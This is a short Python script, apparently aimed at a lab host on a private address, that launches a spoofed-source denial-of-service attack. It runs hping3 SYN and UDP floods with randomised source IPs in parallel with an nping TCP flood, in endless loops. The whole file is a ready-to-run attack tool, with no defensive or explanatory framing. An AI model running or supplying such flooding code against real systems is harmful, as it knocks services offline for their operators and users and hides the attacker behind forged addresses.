#!/usr/bin/env python3
import subprocess
import threading
import time
import random

TARGET = "192.168.56.105"

def spoofed_syn_flood():
    while True:
        cmd = [
            "hping3", TARGET,
            "-S",
            "--flood",
            "--rand-source",   # spoofed source IP
            "-p", "80"
        ]
        print(f"[DDoS] Spoofed SYN flood: {' '.join(cmd)}")
        subprocess.run(cmd)

def spoofed_udp_flood():
    while True:
        cmd = [
            "hping3", TARGET,
            "--udp",
            "--flood",
            "--rand-source",
            "-p", "53"
        ]
        print(f"[DDoS] Spoofed UDP flood: {' '.join(cmd)}")
        subprocess.run(cmd)

def nping_ddos():
    while True:
        cmd = [
            "nping",
            "--tcp",
            "-p", "80",
            "--rate", "500",   # packets per second
            "-c", "10000",
            "--source-port", str(random.randint(1024, 65535)),
            TARGET
        ]
        print(f"[DDoS] nping TCP: {' '.join(cmd)}")
        subprocess.run(cmd)

if __name__ == "__main__":
    try:
        threads = []
        for func in [spoofed_syn_flood, spoofed_udp_flood, nping_ddos]:
            t = threading.Thread(target=func, daemon=True)
            t.start()
            threads.append(t)

        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("[*] DDoS attack stopped.")
